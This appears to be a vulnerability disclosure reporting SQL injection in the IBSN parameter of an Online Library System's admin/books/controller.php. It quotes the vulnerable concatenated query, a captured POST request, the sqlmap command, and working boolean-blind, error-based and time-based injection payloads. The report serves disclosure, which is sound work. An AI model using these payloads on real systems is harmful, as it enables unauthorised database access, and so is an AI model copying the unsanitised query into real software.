@@ -1,0 +1,64 @@
+BUG_AUTHOR:LIU WEIYU
+
+Online Library System - SQL Injection on (admin/books/controller.php IBSN parameter) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/14816/online-library-system-phpmysqli-full-source-code.html
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+admin/books/controller.php
+On this page, IBSN parameter is vulnerable to SQL Injection Attack 
+
+Source code:
+if ($_POST['IBSN'] == "" OR $_POST['BookTitle'] == "" OR $_POST['Category'] == "") {
+	message("All field is required!","error");
+	redirect('index.php?view=add');
+}else{
+	$sql = "SELECT * FROM `tblbooks` WHERE IBSN = '".$_POST['IBSN']."'";
+	$mydb->setQuery($sql);
+	$cur = $mydb->executeQuery();
+	$maxrow = $mydb->num_rows($cur);
+}
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+Request:
+POST /OLS/admin/books/controller.php?action=add HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Content-Length: 303
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=g883r0l08f296hfd9582abk9v0
+Origin: http://localhost
+Referer: http://localhost/OLS/admin/books/index.php?view=add
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+
+Author=1&BookDesc=1&BookPrice=1&BookPublisher=1&BookTitle=1&BookType=Fiction&Category=Computers%2C+Information+and+General+Reference&DDecimal=000&IBSN=123456789&PublishDate=2024-04-02&Remarks=1&savecourse=
+
+-> sqlmap -r 1.txt(above request package) --batch
+
+Output:
+---
+Parameter: IBSN (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: Author=1&BookDesc=1&BookPrice=1&BookPublisher=1&BookTitle=1&BookType=Fiction&Category=Computers, Information and General Reference&DDecimal=000&IBSN=123456789' OR NOT 7483=7483#&PublishDate=2024-04-02&Remarks=1&savecourse=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: Author=1&BookDesc=1&BookPrice=1&BookPublisher=1&BookTitle=1&BookType=Fiction&Category=Computers, Information and General Reference&DDecimal=000&IBSN=123456789' OR (SELECT 8610 FROM(SELECT COUNT(*),CONCAT(0x71716b6271,(SELECT (ELT(8610=8610,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- cHRD&PublishDate=2024-04-02&Remarks=1&savecourse=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: Author=1&BookDesc=1&BookPrice=1&BookPublisher=1&BookTitle=1&BookType=Fiction&Category=Computers, Information and General Reference&DDecimal=000&IBSN=123456789' AND (SELECT 2641 FROM (SELECT(SLEEP(5)))PKXZ)-- zujm&PublishDate=2024-04-02&Remarks=1&savecourse=
+---
+[14:32:58] [INFO] the back-end DBMS is MySQL
+
